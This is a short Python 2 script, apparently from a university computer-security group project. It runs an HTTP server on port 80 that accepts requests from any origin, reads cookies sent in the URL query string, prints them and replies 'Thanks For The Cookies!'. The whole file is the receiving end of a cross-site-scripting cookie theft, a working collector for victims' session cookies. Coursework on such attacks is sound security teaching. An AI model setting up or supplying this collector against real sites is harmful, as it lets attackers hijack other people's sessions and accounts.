#Computer Security Group Project
#Very simple HTTP server in python
#for retrieving cookies from http requests

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import urlparse
import urllib2
import urllib

#The Request Handling Class
class S(BaseHTTPRequestHandler):
    
    #Default headers for request responses
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

    #GET Handler
    def do_GET(self):
        self._set_headers() #set the headers
        parsedUrl = urlparse.urlparse(self.path)    #grap query string from url
        params = urlparse.parse_qs(parsedUrl.query) #parse query string into dictionary
        if(params):         #if there are cookies, print them
            printCookies(params)
        self.wfile.write("<html><body><h1>Thanks For The Cookies!</h1></body></html>") #Response - not really necessary


#Runs the servers      
def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print 'Starting httpd...'
    httpd.serve_forever()

#Print the cookies from a dictionary
def printCookies(cookieDict):
    print 'Cookies: '
    for key, val in cookieDict.iteritems():
        print "\t" + key + ": " + val[0]
    print


if __name__ == "__main__":
    from sys import argv

    #Command line argument for the port number
    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()

